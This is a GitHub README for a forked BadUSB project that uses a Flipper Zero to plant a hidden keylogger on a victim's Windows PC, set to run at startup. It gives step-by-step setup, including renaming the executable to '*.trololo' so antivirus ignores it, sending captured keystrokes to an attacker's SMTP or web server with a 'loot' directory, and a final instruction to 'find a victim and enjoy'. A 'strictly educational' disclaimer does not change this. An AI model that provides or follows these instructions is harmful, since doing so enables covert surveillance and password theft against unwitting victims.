# Forked from https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector

Adaptions for Flipper Zero + Webrequests
Also use the Windows file extension trick to actually convince AV to ignore this file (this is not possible with an exe file)
So we have an executable, however it's called *.trololo
Enhanced smtp transmission as well

# BadUSB_passStealer
# Warning ⚠️
Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**.
# About ℹ️
This **script** allows you to inject an invsible **keylogger** which run on **Windows** startup. To do this i used this [keylogger script](https://github.com/x4nth055/pythoncode-tutorials/tree/master/ethical-hacking/keylogger).

# Getting Started ✔️
## Requirments
1. Have a **Flipper Zero**.

2. Have latest python version installed on your WINDOWS PC;

3. Have latest pip version installed on your WINDOWS PC;

4. Have a victim with **Windows OS** installed in his PC;

5. Either have a public Webserver or a Self hosted smtp server or use gmail/outlook

## Requirements for your Setup
If you take the code 1:1 - a Server with a public IP and Valid HTTPS Certificate, a Webserver and PHP installed. 
Copy the php script, the ps1 file and the exe file (renamed to *.trololo) to your server, create /opt/loot, chown that dir to www-data and
...
Profit!

# Install latest version of Python and pip
## Python
1. Download latest python version (installer 64-bit or 32-bit) [here](https://www.python.org/downloads/windows/);
2. Now run the installer
3. Select "Add python.exe to PATH" checkbox and then click on "install now";
## Pip
1. Launch a powershell prompt and run the following command to download get-pip.py :
```
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
```
2. Then run the following command to install pip :
```
python get-pip.py
```
## Install
1. Download this repository;

**Linux :**
```
git clone https://github.com/GeneralGresi/BadUSB_keyloggerInjector
cd BadUSB_keyloggerInjector
```
**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.

2. Replace your mail and password or webserver host in the file head. If email should be used, scroll to the bottom and change the method to email instead of request

3. Convert keylogger.py in exe file with this command :
```
pip install pyinstaller
pyinstaller --onefile -w keylogger.py
```
4. Upload the files to a webserver

5. Replace link in the *.ps1 script with keylogger.trololo link

6. Put the .txt file on your flipper

7. Find a victim and enjoy !
## Requirments for victim PC
* Turn off caps lock.
* Switch the keyboard layout to French
